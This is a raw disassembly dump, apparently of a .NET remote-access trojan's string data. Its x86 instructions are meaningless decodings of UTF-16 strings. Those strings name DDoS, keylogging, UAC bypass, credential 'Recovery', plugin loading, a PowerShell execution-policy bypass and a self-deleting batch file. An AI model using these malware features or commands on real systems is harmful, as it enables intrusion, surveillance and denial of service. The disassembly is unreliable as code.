  40a5e0:	00 11                	add    %dl,(%ecx)
  40a5e2:	48                   	dec    %eax
  40a5e3:	00 6f 00             	add    %ch,0x0(%edi)
  40a5e6:	73 00                	jae    0x40a5e8
  40a5e8:	74 00                	je     0x40a5ea
  40a5ea:	73 00                	jae    0x40a5ec
  40a5ec:	4d                   	dec    %ebp
  40a5ed:	00 53 00             	add    %dl,0x0(%ebx)
  40a5f0:	47                   	inc    %edi
  40a5f1:	00 00                	add    %al,(%eax)
  40a5f3:	2d 4d 00 6f 00       	sub    $0x6f004d,%eax
  40a5f8:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40a5fc:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a600:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40a605:	00 73 00             	add    %dh,0x0(%ebx)
  40a608:	75 00                	jne    0x40a60a
  40a60a:	63 00                	arpl   %eax,(%eax)
  40a60c:	63 00                	arpl   %eax,(%eax)
  40a60e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a612:	73 00                	jae    0x40a614
  40a614:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40a618:	6c                   	insb   (%dx),%es:(%edi)
  40a619:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40a61d:	00 21                	add    %ah,(%ecx)
  40a61f:	00 00                	add    %al,(%eax)
  40a621:	11 48 00             	adc    %ecx,0x0(%eax)
  40a624:	6f                   	outsl  %ds:(%esi),(%dx)
  40a625:	00 73 00             	add    %dh,0x0(%ebx)
  40a628:	74 00                	je     0x40a62a
  40a62a:	73 00                	jae    0x40a62c
  40a62c:	45                   	inc    %ebp
  40a62d:	00 72 00             	add    %dh,0x0(%edx)
  40a630:	72 00                	jb     0x40a632
  40a632:	00 09                	add    %cl,(%ecx)
  40a634:	44                   	inc    %esp
  40a635:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a639:	00 73 00             	add    %dh,0x0(%ebx)
  40a63c:	00 0d 70 00 6c 00    	add    %cl,0x6c0070
  40a642:	75 00                	jne    0x40a644
  40a644:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a648:	6e                   	outsb  %ds:(%esi),(%dx)
  40a649:	00 00                	add    %al,(%eax)
  40a64b:	15 73 00 65 00       	adc    $0x650073,%eax
  40a650:	6e                   	outsb  %ds:(%esi),(%dx)
  40a651:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40a655:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40a659:	00 67 00             	add    %ah,0x0(%edi)
  40a65c:	69 00 6e 00 00 15    	imul   $0x1500006e,(%eax),%eax
  40a662:	73 00                	jae    0x40a664
  40a664:	61                   	popa
  40a665:	00 76 00             	add    %dh,0x0(%esi)
  40a668:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40a66c:	6c                   	insb   (%dx),%es:(%edi)
  40a66d:	00 75 00             	add    %dh,0x0(%ebp)
  40a670:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a674:	6e                   	outsb  %ds:(%esi),(%dx)
  40a675:	00 00                	add    %al,(%eax)
  40a677:	1b 52 00             	sbb    0x0(%edx),%edx
  40a67a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a67e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a67f:	00 76 00             	add    %dh,0x0(%esi)
  40a682:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40a686:	6c                   	insb   (%dx),%es:(%edi)
  40a687:	00 75 00             	add    %dh,0x0(%ebp)
  40a68a:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a68e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a68f:	00 73 00             	add    %dh,0x0(%ebx)
  40a692:	00 21                	add    %ah,(%ecx)
  40a694:	50                   	push   %eax
  40a695:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40a699:	00 67 00             	add    %ah,0x0(%edi)
  40a69c:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  40a6a2:	20 00                	and    %al,(%eax)
  40a6a4:	52                   	push   %edx
  40a6a5:	00 65 00             	add    %ah,0x0(%ebp)
  40a6a8:	6d                   	insl   (%dx),%es:(%edi)
  40a6a9:	00 6f 00             	add    %ch,0x0(%edi)
  40a6ac:	76 00                	jbe    0x40a6ae
  40a6ae:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  40a6b3:	00 00                	add    %al,(%eax)
  40a6b5:	15 4f 00 66 00       	adc    $0x66004f,%eax
  40a6ba:	66 00 6c 00 69       	data16 add %ch,0x69(%eax,%eax,1)
  40a6bf:	00 6e 00             	add    %ch,0x0(%esi)
  40a6c2:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40a6c6:	65 00 74 00 00       	add    %dh,%gs:0x0(%eax,%eax,1)
  40a6cb:	09 24 00             	or     %esp,(%eax,%eax,1)
  40a6ce:	43                   	inc    %ebx
  40a6cf:	00 61 00             	add    %ah,0x0(%ecx)
  40a6d2:	70 00                	jo     0x40a6d4
  40a6d4:	00 09                	add    %cl,(%ecx)
  40a6d6:	23 00                	and    (%eax),%eax
  40a6d8:	43                   	inc    %ebx
  40a6d9:	00 41 00             	add    %al,0x0(%ecx)
  40a6dc:	50                   	push   %eax
  40a6dd:	00 00                	add    %al,(%eax)
  40a6df:	0d 50 00 6c 00       	or     $0x6c0050,%eax
  40a6e4:	75 00                	jne    0x40a6e6
  40a6e6:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a6ea:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6eb:	00 00                	add    %al,(%eax)
  40a6ed:	07                   	pop    %es
  40a6ee:	52                   	push   %edx
  40a6ef:	00 75 00             	add    %dh,0x0(%ebp)
  40a6f2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6f3:	00 00                	add    %al,(%eax)
  40a6f5:	0d 49 00 6e 00       	or     $0x6e0049,%eax
  40a6fa:	76 00                	jbe    0x40a6fc
  40a6fc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6fd:	00 6b 00             	add    %ch,0x0(%ebx)
  40a700:	65 00 00             	add    %al,%gs:(%eax)
  40a703:	17                   	pop    %ss
  40a704:	52                   	push   %edx
  40a705:	00 75 00             	add    %dh,0x0(%ebp)
  40a708:	6e                   	outsb  %ds:(%esi),(%dx)
  40a709:	00 52 00             	add    %dl,0x0(%edx)
  40a70c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a710:	6f                   	outsl  %ds:(%esi),(%dx)
  40a711:	00 76 00             	add    %dh,0x0(%esi)
  40a714:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a718:	79 00                	jns    0x40a71a
  40a71a:	00 11                	add    %dl,(%ecx)
  40a71c:	52                   	push   %edx
  40a71d:	00 65 00             	add    %ah,0x0(%ebp)
  40a720:	63 00                	arpl   %eax,(%eax)
  40a722:	6f                   	outsl  %ds:(%esi),(%dx)
  40a723:	00 76 00             	add    %dh,0x0(%esi)
  40a726:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a72a:	79 00                	jns    0x40a72c
  40a72c:	00 15 52 00 75 00    	add    %dl,0x750052
  40a732:	6e                   	outsb  %ds:(%esi),(%dx)
  40a733:	00 4f 00             	add    %cl,0x0(%edi)
  40a736:	70 00                	jo     0x40a738
  40a738:	74 00                	je     0x40a73a
  40a73a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a740:	73 00                	jae    0x40a742
  40a742:	00 0d 69 00 6e 00    	add    %cl,0x6e0069
  40a748:	6a 00                	push   $0x0
  40a74a:	52                   	push   %edx
  40a74b:	00 75 00             	add    %dh,0x0(%ebp)
  40a74e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a74f:	00 00                	add    %al,(%eax)
  40a751:	0f 55 00             	andnps (%eax),%xmm0
  40a754:	41                   	inc    %ecx
  40a755:	00 43 00             	add    %al,0x0(%ebx)
  40a758:	46                   	inc    %esi
  40a759:	00 75 00             	add    %dh,0x0(%ebp)
  40a75c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a75d:	00 63 00             	add    %ah,0x0(%ebx)
  40a760:	00 07                	add    %al,(%edi)
  40a762:	45                   	inc    %ebp
  40a763:	00 4e 00             	add    %cl,0x0(%esi)
  40a766:	43                   	inc    %ebx
  40a767:	00 00                	add    %al,(%eax)
  40a769:	07                   	pop    %es
  40a76a:	44                   	inc    %esp
  40a76b:	00 45 00             	add    %al,0x0(%ebp)
  40a76e:	43                   	inc    %ebx
  40a76f:	00 00                	add    %al,(%eax)
  40a771:	1d 50 00 6c 00       	sbb    $0x6c0050,%eax
  40a776:	75 00                	jne    0x40a778
  40a778:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a77c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a77d:	00 20                	add    %ah,(%eax)
  40a77f:	00 45 00             	add    %al,0x0(%ebp)
  40a782:	72 00                	jb     0x40a784
  40a784:	72 00                	jb     0x40a786
  40a786:	6f                   	outsl  %ds:(%esi),(%dx)
  40a787:	00 72 00             	add    %dh,0x0(%edx)
  40a78a:	21 00                	and    %eax,(%eax)
  40a78c:	20 00                	and    %al,(%eax)
  40a78e:	00 07                	add    %al,(%edi)
  40a790:	4d                   	dec    %ebp
  40a791:	00 73 00             	add    %dh,0x0(%ebx)
  40a794:	67 00 00             	add    %al,(%bx,%si)
  40a797:	0f 54 00             	andps  (%eax),%xmm0
  40a79a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a79b:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40a79f:	00 77 00             	add    %dh,0x0(%edi)
  40a7a2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a7a6:	00 0d 4f 00 70 00    	add    %cl,0x70004f
  40a7ac:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a7b0:	20 00                	and    %al,(%eax)
  40a7b2:	5b                   	pop    %ebx
  40a7b3:	00 00                	add    %al,(%eax)
  40a7b5:	03 5d 00             	add    0x0(%ebp),%ebx
  40a7b8:	00 07                	add    %al,(%edi)
  40a7ba:	47                   	inc    %edi
  40a7bb:	00 45 00             	add    %al,0x0(%ebp)
  40a7be:	54                   	push   %esp
  40a7bf:	00 00                	add    %al,(%eax)
  40a7c1:	09 2e                	or     %ebp,(%esi)
  40a7c3:	00 70 00             	add    %dh,0x0(%eax)
  40a7c6:	73 00                	jae    0x40a7c8
  40a7c8:	31 00                	xor    %eax,(%eax)
  40a7ca:	00 3f                	add    %bh,(%edi)
  40a7cc:	2d 00 45 00 78       	sub    $0x78004500,%eax
  40a7d1:	00 65 00             	add    %ah,0x0(%ebp)
  40a7d4:	63 00                	arpl   %eax,(%eax)
  40a7d6:	75 00                	jne    0x40a7d8
  40a7d8:	74 00                	je     0x40a7da
  40a7da:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a7e0:	50                   	push   %eax
  40a7e1:	00 6f 00             	add    %ch,0x0(%edi)
  40a7e4:	6c                   	insb   (%dx),%es:(%edi)
  40a7e5:	00 69 00             	add    %ch,0x0(%ecx)
  40a7e8:	63 00                	arpl   %eax,(%eax)
  40a7ea:	79 00                	jns    0x40a7ec
  40a7ec:	20 00                	and    %al,(%eax)
  40a7ee:	42                   	inc    %edx
  40a7ef:	00 79 00             	add    %bh,0x0(%ecx)
  40a7f2:	70 00                	jo     0x40a7f4
  40a7f4:	61                   	popa
  40a7f5:	00 73 00             	add    %dh,0x0(%ebx)
  40a7f8:	73 00                	jae    0x40a7fa
  40a7fa:	20 00                	and    %al,(%eax)
  40a7fc:	2d 00 46 00 69       	sub    $0x69004600,%eax
  40a801:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a805:	00 20                	add    %ah,(%eax)
  40a807:	00 22                	add    %ah,(%edx)
  40a809:	00 01                	add    %al,(%ecx)
  40a80b:	2f                   	das
  40a80c:	50                   	push   %eax
  40a80d:	00 4f 00             	add    %cl,0x0(%edi)
  40a810:	53                   	push   %ebx
  40a811:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40a815:	00 2f                	add    %ch,(%edi)
  40a817:	00 20                	add    %ah,(%eax)
  40a819:	00 48 00             	add    %cl,0x0(%eax)
  40a81c:	54                   	push   %esp
  40a81d:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40a821:	00 2f                	add    %ch,(%edi)
  40a823:	00 31                	add    %dh,(%ecx)
  40a825:	00 2e                	add    %ch,(%esi)
  40a827:	00 31                	add    %dh,(%ecx)
  40a829:	00 0d 00 0a 00 48    	add    %cl,0x48000a00
  40a82f:	00 6f 00             	add    %ch,0x0(%edi)
  40a832:	73 00                	jae    0x40a834
  40a834:	74 00                	je     0x40a836
  40a836:	3a 00                	cmp    (%eax),%al
  40a838:	20 00                	and    %al,(%eax)
  40a83a:	00 80 af 0d 00 0a    	add    %al,0xa000daf(%eax)
  40a840:	00 43 00             	add    %al,0x0(%ebx)
  40a843:	6f                   	outsl  %ds:(%esi),(%dx)
  40a844:	00 6e 00             	add    %ch,0x0(%esi)
  40a847:	6e                   	outsb  %ds:(%esi),(%dx)
  40a848:	00 65 00             	add    %ah,0x0(%ebp)
  40a84b:	63 00                	arpl   %eax,(%eax)
  40a84d:	74 00                	je     0x40a84f
  40a84f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a855:	3a 00                	cmp    (%eax),%al
  40a857:	20 00                	and    %al,(%eax)
  40a859:	6b 00 65             	imul   $0x65,(%eax),%eax
  40a85c:	00 65 00             	add    %ah,0x0(%ebp)
  40a85f:	70 00                	jo     0x40a861
  40a861:	2d 00 61 00 6c       	sub    $0x6c006100,%eax
  40a866:	00 69 00             	add    %ch,0x0(%ecx)
  40a869:	76 00                	jbe    0x40a86b
  40a86b:	65 00 0d 00 0a 00 43 	add    %cl,%gs:0x43000a00
  40a872:	00 6f 00             	add    %ch,0x0(%edi)
  40a875:	6e                   	outsb  %ds:(%esi),(%dx)
  40a876:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a87a:	00 6e 00             	add    %ch,0x0(%esi)
  40a87d:	74 00                	je     0x40a87f
  40a87f:	2d 00 54 00 79       	sub    $0x79005400,%eax
  40a884:	00 70 00             	add    %dh,0x0(%eax)
  40a887:	65 00 3a             	add    %bh,%gs:(%edx)
  40a88a:	00 20                	add    %ah,(%eax)
  40a88c:	00 61 00             	add    %ah,0x0(%ecx)
  40a88f:	70 00                	jo     0x40a891
  40a891:	70 00                	jo     0x40a893
  40a893:	6c                   	insb   (%dx),%es:(%edi)
  40a894:	00 69 00             	add    %ch,0x0(%ecx)
  40a897:	63 00                	arpl   %eax,(%eax)
  40a899:	61                   	popa
  40a89a:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a89e:	00 6f 00             	add    %ch,0x0(%edi)
  40a8a1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8a2:	00 2f                	add    %ch,(%edi)
  40a8a4:	00 78 00             	add    %bh,0x0(%eax)
  40a8a7:	2d 00 77 00 77       	sub    $0x77007700,%eax
  40a8ac:	00 77 00             	add    %dh,0x0(%edi)
  40a8af:	2d 00 66 00 6f       	sub    $0x6f006600,%eax
  40a8b4:	00 72 00             	add    %dh,0x0(%edx)
  40a8b7:	6d                   	insl   (%dx),%es:(%edi)
  40a8b8:	00 2d 00 75 00 72    	add    %ch,0x72007500
  40a8be:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a8c2:	00 6e 00             	add    %ch,0x0(%esi)
  40a8c5:	63 00                	arpl   %eax,(%eax)
  40a8c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8c8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a8cc:	00 64 00 0d          	add    %ah,0xd(%eax,%eax,1)
  40a8d0:	00 0a                	add    %cl,(%edx)
  40a8d2:	00 55 00             	add    %dl,0x0(%ebp)
  40a8d5:	73 00                	jae    0x40a8d7
  40a8d7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a8db:	2d 00 41 00 67       	sub    $0x67004100,%eax
  40a8e0:	00 65 00             	add    %ah,0x0(%ebp)
  40a8e3:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8e4:	00 74 00 3a          	add    %dh,0x3a(%eax,%eax,1)
  40a8e8:	00 20                	add    %ah,(%eax)
  40a8ea:	00 01                	add    %al,(%ecx)
  40a8ec:	35 0d 00 0a 00       	xor    $0xa000d,%eax
  40a8f1:	43                   	inc    %ebx
  40a8f2:	00 6f 00             	add    %ch,0x0(%edi)
  40a8f5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8f6:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a8fa:	00 6e 00             	add    %ch,0x0(%esi)
  40a8fd:	74 00                	je     0x40a8ff
  40a8ff:	2d 00 6c 00 65       	sub    $0x65006c00,%eax
  40a904:	00 6e 00             	add    %ch,0x0(%esi)
  40a907:	67 00 74 00          	add    %dh,0x0(%si)
  40a90b:	68 00 3a 00 20       	push   $0x20003a00
  40a910:	00 35 00 32 00 33    	add    %dh,0x33003200
  40a916:	00 35 00 0d 00 0a    	add    %dh,0xa000d00
  40a91c:	00 0d 00 0a 00 01    	add    %cl,0x1000a00
  40a922:	11 73 00             	adc    %esi,0x0(%ebx)
  40a925:	63 00                	arpl   %eax,(%eax)
  40a927:	68 00 74 00 61       	push   $0x61007400
  40a92c:	00 73 00             	add    %dh,0x0(%ebx)
  40a92f:	6b 00 73             	imul   $0x73,(%eax),%eax
  40a932:	00 00                	add    %al,(%eax)
  40a934:	23 2f                	and    (%edi),%ebp
  40a936:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a93a:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a93e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a942:	00 20                	add    %ah,(%eax)
  40a944:	00 2f                	add    %ch,(%edi)
  40a946:	00 66 00             	add    %ah,0x0(%esi)
  40a949:	20 00                	and    %al,(%eax)
  40a94b:	20 00                	and    %al,(%eax)
  40a94d:	2f                   	das
  40a94e:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40a952:	00 20                	add    %ah,(%eax)
  40a954:	00 22                	add    %ah,(%edx)
  40a956:	00 00                	add    %al,(%eax)
  40a958:	09 2e                	or     %ebp,(%esi)
  40a95a:	00 62 00             	add    %ah,0x0(%edx)
  40a95d:	61                   	popa
  40a95e:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40a962:	13 40 00             	adc    0x0(%eax),%eax
  40a965:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a969:	68 00 6f 00 20       	push   $0x20006f00
  40a96e:	00 6f 00             	add    %ch,0x0(%edi)
  40a971:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40a975:	00 1f                	add    %bl,(%edi)
  40a977:	74 00                	je     0x40a979
  40a979:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40a97f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a980:	00 75 00             	add    %dh,0x0(%ebp)
  40a983:	74 00                	je     0x40a985
  40a985:	20 00                	and    %al,(%eax)
  40a987:	33 00                	xor    (%eax),%eax
  40a989:	20 00                	and    %al,(%eax)
  40a98b:	3e 00 20             	add    %ah,%ds:(%eax)
  40a98e:	00 4e 00             	add    %cl,0x0(%esi)
  40a991:	55                   	push   %ebp
  40a992:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40a996:	07                   	pop    %es
  40a997:	43                   	inc    %ebx
  40a998:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40a99c:	00 00                	add    %al,(%eax)
  40a99e:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40a9a2:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40a9a6:	00 22                	add    %ah,(%edx)
  40a9a8:	00 00                	add    %al,(%eax)
  40a9aa:	0f 22 00             	mov    %eax,%cr0
  40a9ad:	20 00                	and    %al,(%eax)
  40a9af:	2f                   	das
  40a9b0:	00 66 00             	add    %ah,0x0(%esi)
  40a9b3:	20 00                	and    %al,(%eax)
  40a9b5:	2f                   	das
  40a9b6:	00 71 00             	add    %dh,0x0(%ecx)
  40a9b9:	00 0f                	add    %cl,(%edi)
  40a9bb:	54                   	push   %esp
  40a9bc:	00 6f 00             	add    %ch,0x0(%edi)
  40a9bf:	55                   	push   %ebp
  40a9c0:	00 70 00             	add    %dh,0x0(%eax)
  40a9c3:	70 00                	jo     0x40a9c5
  40a9c5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a9c9:	00 03                	add    %al,(%ebx)
  40a9cb:	5b                   	pop    %ebx
  40a9cc:	00 00                	add    %al,(%eax)
  40a9ce:	0b 53 00             	or     0x0(%ebx),%edx
  40a9d1:	70 00                	jo     0x40a9d3
  40a9d3:	61                   	popa
  40a9d4:	00 63 00             	add    %ah,0x0(%ebx)
  40a9d7:	65 00 00             	add    %al,%gs:(%eax)
  40a9da:	0f 5b 00             	cvtdq2ps (%eax),%xmm0
  40a9dd:	53                   	push   %ebx
  40a9de:	00 50 00             	add    %dl,0x0(%eax)
  40a9e1:	41                   	inc    %ecx
  40a9e2:	00 43 00             	add    %al,0x0(%ebx)
  40a9e5:	45                   	inc    %ebp
  40a9e6:	00 5d 00             	add    %bl,0x0(%ebp)
  40a9e9:	00 0d 52 00 65 00    	add    %cl,0x650052
  40a9ef:	74 00                	je     0x40a9f1
  40a9f1:	75 00                	jne    0x40a9f3
  40a9f3:	72 00                	jb     0x40a9f5
  40a9f5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9f6:	00 00                	add    %al,(%eax)
  40a9f8:	0f 5b 00             	cvtdq2ps (%eax),%xmm0
  40a9fb:	45                   	inc    %ebp
  40a9fc:	00 4e 00             	add    %cl,0x0(%esi)
  40a9ff:	54                   	push   %esp
  40aa00:	00 45 00             	add    %al,0x0(%ebp)
  40aa03:	52                   	push   %edx
  40aa04:	00 5d 00             	add    %bl,0x0(%ebp)
  40aa07:	00 0d 45 00 73 00    	add    %cl,0x730045
  40aa0d:	63 00                	arpl   %eax,(%eax)
  40aa0f:	61                   	popa
  40aa10:	00 70 00             	add    %dh,0x0(%eax)
  40aa13:	65 00 00             	add    %al,%gs:(%eax)
  40aa16:	0b 5b 00             	or     0x0(%ebx),%ebx
  40aa19:	45                   	inc    %ebp
  40aa1a:	00 53 00             	add    %dl,0x0(%ebx)
  40aa1d:	43                   	inc    %ebx
  40aa1e:	00 5d 00             	add    %bl,0x0(%ebp)
  40aa21:	00 17                	add    %dl,(%edi)
  40aa23:	4c                   	dec    %esp
  40aa24:	00 43 00             	add    %al,0x0(%ebx)
  40aa27:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa28:	00 6e 00             	add    %ch,0x0(%esi)
  40aa2b:	74 00                	je     0x40aa2d
  40aa2d:	72 00                	jb     0x40aa2f
  40aa2f:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa30:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40aa34:	00 65 00             	add    %ah,0x0(%ebp)
  40aa37:	79 00                	jns    0x40aa39
  40aa39:	00 0d 5b 00 43 00    	add    %cl,0x43005b
  40aa3f:	54                   	push   %esp
  40aa40:	00 52 00             	add    %dl,0x0(%edx)
  40aa43:	4c                   	dec    %esp
  40aa44:	00 5d 00             	add    %bl,0x0(%ebp)
  40aa47:	00 17                	add    %dl,(%edi)
  40aa49:	52                   	push   %edx
  40aa4a:	00 43 00             	add    %al,0x0(%ebx)
  40aa4d:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa4e:	00 6e 00             	add    %ch,0x0(%esi)
  40aa51:	74 00                	je     0x40aa53
  40aa53:	72 00                	jb     0x40aa55
  40aa55:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa56:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40aa5a:	00 65 00             	add    %ah,0x0(%ebp)
  40aa5d:	79 00                	jns    0x40aa5f
  40aa5f:	00 13                	add    %dl,(%ebx)
  40aa61:	52                   	push   %edx
  40aa62:	00 53 00             	add    %dl,0x0(%ebx)
  40aa65:	68 00 69 00 66       	push   $0x66006900
  40aa6a:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40aa6e:	00 65 00             	add    %ah,0x0(%ebp)
  40aa71:	79 00                	jns    0x40aa73
  40aa73:	00 0f                	add    %cl,(%edi)
  40aa75:	5b                   	pop    %ebx
  40aa76:	00 53 00             	add    %dl,0x0(%ebx)
  40aa79:	68 00 69 00 66       	push   $0x66006900
  40aa7e:	00 74 00 5d          	add    %dh,0x5d(%eax,%eax,1)
  40aa82:	00 00                	add    %al,(%eax)
  40aa84:	13 4c 00 53          	adc    0x53(%eax,%eax,1),%ecx
  40aa88:	00 68 00             	add    %ch,0x0(%eax)
  40aa8b:	69 00 66 00 74 00    	imul   $0x740066,(%eax),%eax
  40aa91:	4b                   	dec    %ebx
  40aa92:	00 65 00             	add    %ah,0x0(%ebp)
  40aa95:	79 00                	jns    0x40aa97
  40aa97:	00 09                	add    %cl,(%ecx)
  40aa99:	42                   	inc    %edx
  40aa9a:	00 61 00             	add    %ah,0x0(%ecx)
  40aa9d:	63 00                	arpl   %eax,(%eax)
  40aa9f:	6b 00 00             	imul   $0x0,(%eax),%eax
  40aaa2:	0d 5b 00 42 00       	or     $0x42005b,%eax
  40aaa7:	61                   	popa
  40aaa8:	00 63 00             	add    %ah,0x0(%ebx)
  40aaab:	6b 00 5d             	imul   $0x5d,(%eax),%eax
  40aaae:	00 00                	add    %al,(%eax)
  40aab0:	09 4c 00 57          	or     %ecx,0x57(%eax,%eax,1)
  40aab4:	00 69 00             	add    %ch,0x0(%ecx)
  40aab7:	6e                   	outsb  %ds:(%esi),(%dx)
  40aab8:	00 00                	add    %al,(%eax)
  40aaba:	0b 5b 00             	or     0x0(%ebx),%ebx
  40aabd:	57                   	push   %edi
  40aabe:	00 49 00             	add    %cl,0x0(%ecx)
  40aac1:	4e                   	dec    %esi
  40aac2:	00 5d 00             	add    %bl,0x0(%ebp)
  40aac5:	00 07                	add    %al,(%edi)
  40aac7:	54                   	push   %esp
  40aac8:	00 61 00             	add    %ah,0x0(%ecx)
  40aacb:	62 00                	bound  %eax,(%eax)
  40aacd:	00 0b                	add    %cl,(%ebx)
  40aacf:	5b                   	pop    %ebx
  40aad0:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40aad4:	00 62 00             	add    %ah,0x0(%edx)
  40aad7:	5d                   	pop    %ebp
  40aad8:	00 00                	add    %al,(%eax)
  40aada:	0f 43 00             	cmovae (%eax),%eax
  40aadd:	61                   	popa
  40aade:	00 70 00             	add    %dh,0x0(%eax)
  40aae1:	69 00 74 00 61 00    	imul   $0x610074,(%eax),%eax
  40aae7:	6c                   	insb   (%dx),%es:(%edi)
  40aae8:	00 00                	add    %al,(%eax)
  40aaea:	1f                   	pop    %ds
  40aaeb:	5b                   	pop    %ebx
  40aaec:	00 43 00             	add    %al,0x0(%ebx)
  40aaef:	41                   	inc    %ecx
  40aaf0:	00 50 00             	add    %dl,0x0(%eax)
  40aaf3:	53                   	push   %ebx
  40aaf4:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40aaf8:	00 43 00             	add    %al,0x0(%ebx)
  40aafb:	4b                   	dec    %ebx
  40aafc:	00 3a                	add    %bh,(%edx)
  40aafe:	00 20                	add    %ah,(%eax)
  40ab00:	00 4f 00             	add    %cl,0x0(%edi)
  40ab03:	46                   	inc    %esi
  40ab04:	00 46 00             	add    %al,0x0(%esi)
  40ab07:	5d                   	pop    %ebp
  40ab08:	00 00                	add    %al,(%eax)
  40ab0a:	1d 5b 00 43 00       	sbb    $0x43005b,%eax
  40ab0f:	41                   	inc    %ecx
  40ab10:	00 50 00             	add    %dl,0x0(%eax)
  40ab13:	53                   	push   %ebx
  40ab14:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40ab18:	00 43 00             	add    %al,0x0(%ebx)
  40ab1b:	4b                   	dec    %ebx
  40ab1c:	00 3a                	add    %bh,(%edx)
  40ab1e:	00 20                	add    %ah,(%eax)
  40ab20:	00 4f 00             	add    %cl,0x0(%edi)
  40ab23:	4e                   	dec    %esi
  40ab24:	00 5d 00             	add    %bl,0x0(%ebp)
  40ab27:	00 0b                	add    %cl,(%ebx)
  40ab29:	23 00                	and    (%eax),%eax
  40ab2b:	23 00                	and    (%eax),%eax
  40ab2d:	23 00                	and    (%eax),%eax
  40ab2f:	20 00                	and    %al,(%eax)
  40ab31:	20 00                	and    %al,(%eax)
  40ab33:	00 09                	add    %cl,(%ecx)
  40ab35:	20 00                	and    %al,(%eax)
  40ab37:	23 00                	and    (%eax),%eax
  40ab39:	23 00                	and    (%eax),%eax
  40ab3b:	23 00                	and    (%eax),%eax
  40ab3d:	00 1f                	add    %bl,(%edi)
  40ab3f:	4d                   	dec    %ebp
  40ab40:	00 61 00             	add    %ah,0x0(%ecx)
  40ab43:	69 00 6e 00 57 00    	imul   $0x57006e,(%eax),%eax
  40ab49:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40ab4f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab50:	00 77 00             	add    %dh,0x0(%edi)
  40ab53:	54                   	push   %esp
  40ab54:	00 69 00             	add    %ch,0x0(%ecx)
  40ab57:	74 00                	je     0x40ab59
  40ab59:	6c                   	insb   (%dx),%es:(%edi)
  40ab5a:	00 65 00             	add    %ah,0x0(%ebp)
